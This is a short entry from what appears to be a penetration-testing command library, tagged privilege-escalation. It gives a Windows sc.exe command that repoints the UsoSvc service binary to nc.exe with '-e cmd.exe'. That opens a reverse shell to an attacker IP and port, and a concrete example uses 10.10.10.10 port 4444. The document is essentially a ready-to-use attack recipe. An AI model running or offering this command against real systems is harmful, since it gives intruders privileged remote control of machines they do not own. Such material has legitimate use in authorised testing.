---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
name: Configure UsoSvc BinPath MSSQL NC
type: command
executor: cmd
data: >-
  sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe $_ATTACKER_IP
  $_ATTACKER_PORT -e cmd.exe"
output: null
created_at: '2023-04-06T03:56:29.494877+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - service-exploitation
verified: true
validated: true
---

# Configure UsoSvc BinPath MSSQL NC

## Command

```cmd
sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe $_ATTACKER_IP $_ATTACKER_PORT -e cmd.exe"
```

## Description

Alternative configuration using a user-specific writable path for nc.exe, targeting service account directories.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `config` | Operation to change service configuration | Yes |
| `UsoSvc` | Service name | Yes |
| `binpath=` | Sets the binary path (note: no space after =) | Yes |
| `$_ATTACKER_IP` | Attacker IP | Yes |
| `$_ATTACKER_PORT` | Attacker port | Yes |

## Examples

### Basic Usage

```cmd
sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

## Expected Output

[SC] ChangeServiceConfig SUCCESS

## Related

- [[procedures/usosvc-service-account-remote-command-execution]]
- [[commands/configure-usosvc-binpath-spool-nc]]
